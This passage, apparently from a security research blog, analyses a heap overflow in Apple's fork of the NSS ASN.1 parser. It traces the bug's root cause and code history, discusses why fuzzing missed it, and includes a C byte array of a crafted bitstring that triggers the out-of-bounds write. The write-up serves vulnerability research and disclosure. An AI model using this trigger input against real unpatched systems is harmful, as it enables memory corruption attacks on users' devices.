the comment implies, if both &lt;/span&gt;&lt;span class=\"c7\"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;at this point and &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;substring&lt;/span&gt;&lt;span&gt;&amp;nbsp;is true, then (they believe) it &lt;/span&gt;&lt;span class=\"c17\"&gt;must&lt;/span&gt;&lt;span&gt;&amp;nbsp;be the case that they are currently parsing a substring of an outer-level indefinite string, which has no definite-sized buffer already allocated. In that case the meaning of the &lt;/span&gt;&lt;span class=\"c30\"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer is different to that which we describe earlier: it&amp;#39;s merely a temporary buffer meant to hold only this substring. Just above here &lt;/span&gt;&lt;span class=\"c7\"&gt;alloc_len&lt;/span&gt;&lt;span&gt;&amp;nbsp;was set to the content length of this substring; and for the outer-&lt;/span&gt;&lt;span class=\"c17\"&gt;definite&lt;/span&gt;&lt;span&gt;-length case it&amp;#39;s vitally important that &lt;/span&gt;&lt;span class=\"c7\"&gt;alloc_len&lt;/span&gt;&lt;span&gt;&amp;nbsp;then gets set to 0 here (which is really indicating that a buffer has &lt;/span&gt;&lt;span class=\"c17\"&gt;already&lt;/span&gt;&lt;span&gt;&amp;nbsp;been allocated and they &lt;/span&gt;&lt;span class=\"c17\"&gt;must not&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;allocate a new one.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;To emphasize the potentially subtle point: the issue is that using this conjunction (&lt;/span&gt;&lt;span class=\"c30\"&gt;state-&amp;gt;substring &amp;amp;&amp;amp; !item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;) for determining whether this a substring of a definite length or outer-level-indefinite string is &lt;/span&gt;&lt;span class=\"c17\"&gt;not&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;the same as the method used by the convoluted bounds checking code we saw earlier. That method walks up the current state stack and checks the indefinite bits of the super-strings to determine whether they&amp;#39;re processing a substring of an outer-level-indefinite string.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Putting that all together, you might be able to see where this is going... (but it is still pretty subtle.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Assume that we have an outer definite-length constructed bitstring with three primitive bitstrings as substrings:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrOQ03pJyD_2kyYzOGet_H7mP9Lt9Q297bOTvQ_nuYVxzItU8QoydNBJKi9CS537QEi5dSLjoK_y7rEw-VouOmd52e30UMUqgMCQWA06maNKRshSqr2eyyaIHqtfy-okXJy2qxcsiBuNvNO8FXGCHXSwjAzEWl5esvG0N8ObbRPK3eIOam7z3WMQMG/s831/image5%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrOQ03pJyD_2kyYzOGet_H7mP9Lt9Q297bOTvQ_nuYVxzItU8QoydNBJKi9CS537QEi5dSLjoK_y7rEw-VouOmd52e30UMUqgMCQWA06maNKRshSqr2eyyaIHqtfy-okXJy2qxcsiBuNvNO8FXGCHXSwjAzEWl5esvG0N8ObbRPK3eIOam7z3WMQMG/s831/image5%20%281%29%281%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750; max-width: 600px; \"title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Upon encountering the first outer-most definite length constructed bitstring, the code will allocate a fixed-size buffer, large enough to store all the remaining input which makes up this string, which in this case is 42 bytes. At this point &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;points to that buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;They then allocate a child state, which gets a copy of the &lt;/span&gt;&lt;span class=\"c7\"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer (not a copy of the &lt;/span&gt;&lt;span class=\"c7\"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;object; a copy of a pointer &lt;/span&gt;&lt;span class=\"c26\"&gt;to&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;it), and proceed to parse the first child substring.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;This is a primitive bitstring with a length of &lt;/span&gt;&lt;span class=\"c7\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;which triggers the vulnerable path in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;and sets &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;. The state machine skips ahead to &lt;/span&gt;&lt;span class=\"c7\"&gt;beforeEndOfContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;then eventually the next substring gets parsed - this time with &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data == NULL&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Now the logic goes wrong in a bad way and, as we saw in the snippet above, a new &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer gets allocated which is the size of only this substring (2 bytes) when in fact &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;should already point to a buffer large enough to hold the entire outer-level-indefinite input string. This bitstring&amp;#39;s contents then get parsed and copied into that buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Now we come to the third substring. &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is no longer &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;; but the code now has no way of determining that the buffer was in fact only (erroneously) allocated to hold a single substring. It believes the invariant that &lt;/span&gt;&lt;span class=\"c7\"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;only gets allocated &lt;/span&gt;&lt;span class=\"c17\"&gt;once&lt;/span&gt;&lt;span&gt;, when the first outer-level definite length string is encountered, and it&amp;#39;s that fact alone which it uses to determine whether &lt;/span&gt;&lt;span class=\"c7\"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;points to a buffer large enough to have this substring appended to it. It then happily appends this third substring, writing outside the bounds of the buffer allocated to store only the second substring.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c17 c28\"&gt;This gives you a great memory corruption primitive: you can cause allocations of a controlled size and then overflow them with an arbitrary number of arbitrary bytes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Here&amp;#39;s an example encoding for an ASN.1 bitstring which triggers this issue:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1261584b92e8184a2715fd7e3223a95479b2f4e0\"&gt;&lt;/a&gt;&lt;a id=\"t.15\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp;uint8_t concat_bitstrings_constructed_definite_with_zero_len_realloc&lt;/span&gt;&lt;span class=\"c1\"&gt;[]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;span class=\"c3\"&gt;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_CONSTRUCTED &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// (0x23)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x4a&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// initial allocation size&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x1&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// force item-&amp;gt;Data = NULL&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x0&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x2&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// this is the reallocation size&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x0&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0xff&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// only byte of bitstring&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x41&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0x0&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0xff&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0xff&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c23\"&gt;// -- continues for overflow&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class=\"c8 c15 c32\" id=\"h.vxzzlpbs8x7\"&gt;&lt;span class=\"c31 c28\"&gt;Why wasn&amp;#39;t this found by fuzzing?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;This is a reasonable question to ask. This source code is really really hard to audit, even with the diff it was at least a week of work to figure out the true root cause of the bug. I&amp;#39;m not sure if I would have spotted this issue during a code audit. It&amp;#39;s very broken but it&amp;#39;s quite subtle and you have to figure out a &lt;/span&gt;&lt;span class=\"c17\"&gt;lot&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;about the state machine and the bounds-checking rules to see it - I think I might have given up before I figured it out and gone to look for something easier.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;But the trigger test-case is neither structurally complex nor large, and feels within-grasp for a fuzzer. So why wasn&amp;#39;t it found? I&amp;#39;ll offer two points for discussion:&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c8 c15 c33\" id=\"h.3uiruiqbxcn4\"&gt;&lt;span class=\"c10\"&gt;Perhaps it&amp;#39;s not being fuzzed?&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Or at least, it&amp;#39;s not being fuzzed in the exact form which it appears in Apple&amp;#39;s Security.framework library. I understand that both Mozilla and Google do fuzz the NSS ASN.1 parser and have found a bunch of vulnerabilities, but note that the key part of the vulnerable code (&amp;quot;&lt;/span&gt;&lt;span class=\"c30\"&gt;|| (state-&amp;gt;contents_length == 1&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"c30\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;) isn&amp;#39;t present in upstream NSS (more on that below.)&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c33 c8 c15\" id=\"h.d8eztr5gmfv7\"&gt;&lt;span class=\"c10\"&gt;Can it be fuzzed effectively?&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Even if you did build the Security.framework version of the code and used a coverage guided fuzzer, you might well not trigger any crashes. The code uses a custom heap allocator and you&amp;#39;d have to either replace that with direct calls to the system allocator or use ASAN&amp;#39;s custom allocator hooks. Note that &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://searchfox.org/mozilla-central/source/nsprpub/lib/ds/plarena.h#128\"&gt;upstream NSS does do that&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but as I &lt;/span&gt;&lt;span&gt;understand&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;it, Apple&amp;#39;s fork doesn&amp;#39;t.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8 c15\" id=\"h.k3orbgexvo70\"&gt;&lt;span class=\"c31 c28\"&gt;History&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;I&amp;#39;m always interested in not just understanding how a vulnerability works but how it was introduced. This case is a particularly compelling example because once you understand the bug, the code construct initially looks extremely suspicious. It &lt;/span&gt;&lt;span class=\"c17\"&gt;only&lt;/span&gt;&lt;span&gt;&amp;nbsp;exists in Apple&amp;#39;s fork of NSS and the only impact of that change is to introduce a perfect memory corruption primitive. But let&amp;#39;s go through the history of the code to convince ourselves that it is &lt;/span&gt;&lt;span&gt;much more likely that it was just an unfortunate accident:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The earliest reference to this code I can find is &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/jrmuizel/mozilla-cvs-history/blob/5dea64f5a5bc55978a9f4632a5f59679572c7985/security/nss/lib/util/secasn1d.c\"&gt;this, which appears to be the initial checkin in the Mozilla CVS repo on March 31, 2000&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.fa2500551086942ee26203176218d93c890969af\"&gt;&lt;/a&gt;&lt;a id=\"t.16\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;static&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;len &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span 